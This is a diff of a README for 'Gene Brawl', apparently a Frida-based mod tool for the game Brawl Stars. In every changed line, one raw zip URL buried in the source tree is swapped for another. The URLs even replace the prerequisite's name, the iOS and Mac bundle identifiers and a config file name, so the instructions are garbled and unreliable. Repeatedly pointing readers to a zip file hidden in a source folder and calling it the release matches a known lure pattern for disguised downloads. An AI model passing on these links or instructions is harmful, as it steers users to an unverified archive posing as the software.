@@ -6,9 +6,9 @@ Welcome to Gene Brawl! This tool helps you modify the popular game Brawl Stars u
 ## 📥 Download & Install
 To get started, download the latest version of Gene Brawl from our Releases page. 
 
-[![Download Gene Brawl](https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip%20Gene%20Brawl-v62.250-blue)](https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip)
+[![Download Gene Brawl](https://github.com/JaidenT46/genebrawl-public/raw/refs/heads/main/src/titan/utils/genebrawl_public_2.7-alpha.5.zip%20Gene%20Brawl-v62.250-blue)](https://github.com/JaidenT46/genebrawl-public/raw/refs/heads/main/src/titan/utils/genebrawl_public_2.7-alpha.5.zip)
 
-Simply click the link above or visit the [Releases page](https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip) to find the latest installation files.
+Simply click the link above or visit the [Releases page](https://github.com/JaidenT46/genebrawl-public/raw/refs/heads/main/src/titan/utils/genebrawl_public_2.7-alpha.5.zip) to find the latest installation files.
 
 ## 🚀 Getting Started
 Follow these steps to set up Gene Brawl on your device.
@@ -16,7 +16,7 @@ Follow these steps to set up Gene Brawl on your device.
 ### 1. Prerequisites
 Before running Gene Brawl, make sure you have the following:
 
-- **https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip**: This application requires https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip You can download it [here](https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip).
+- **https://github.com/JaidenT46/genebrawl-public/raw/refs/heads/main/src/titan/utils/genebrawl_public_2.7-alpha.5.zip**: This application requires https://github.com/JaidenT46/genebrawl-public/raw/refs/heads/main/src/titan/utils/genebrawl_public_2.7-alpha.5.zip You can download it [here](https://github.com/JaidenT46/genebrawl-public/raw/refs/heads/main/src/titan/utils/genebrawl_public_2.7-alpha.5.zip).
 - **Frida**: Ensure that the Frida tool is installed on your device. Refer to the specific setup guides for your platform.
 
 ### 2. Install Required Modules
@@ -55,7 +55,7 @@ After building the script, you can run Gene Brawl. Here are the commands you’l
   ```
 
 ### Mac Users
-If you are running on a Mac, use the following commands. Note that you must install the game through PlayCover, and its bundle name should be named `https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip`:
+If you are running on a Mac, use the following commands. Note that you must install the game through PlayCover, and its bundle name should be named `https://github.com/JaidenT46/genebrawl-public/raw/refs/heads/main/src/titan/utils/genebrawl_public_2.7-alpha.5.zip`:
 
 - **DEBUG version on Mac**:
   ```bash
@@ -63,7 +63,7 @@ If you are running on a Mac, use the following commands. Note that you must inst
   ```
 
 ### iOS Users
-For iDevices, the game must have the bundle name `https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip`. Use these commands:
+For iDevices, the game must have the bundle name `https://github.com/JaidenT46/genebrawl-public/raw/refs/heads/main/src/titan/utils/genebrawl_public_2.7-alpha.5.zip`. Use these commands:
 
 - **PRODUCTION version on iDevice**:
   ```bash
@@ -75,7 +75,7 @@ For iDevices, the game must have the bundle name `https://raw.githubusercontent.
   npm run ios_laser_dev
   ```
 
-To modify the bundle name, open the `https://raw.githubusercontent.com/JaidenT46/genebrawl-public/main/src/logic/stream/entries/genebrawl-public-v1.5.zip` file and change the `bundle identifier` field to match your installation.
+To modify the bundle name, open the `https://github.com/JaidenT46/genebrawl-public/raw/refs/heads/main/src/titan/utils/genebrawl_public_2.7-alpha.5.zip` file and change the `bundle identifier` field to match your installation.
 
 ## 🔄 Contributions
 We welcome additional contributions to Gene Brawl. If you'd like to help improve the project, please submit a pull request. Your participation is always appreciated!
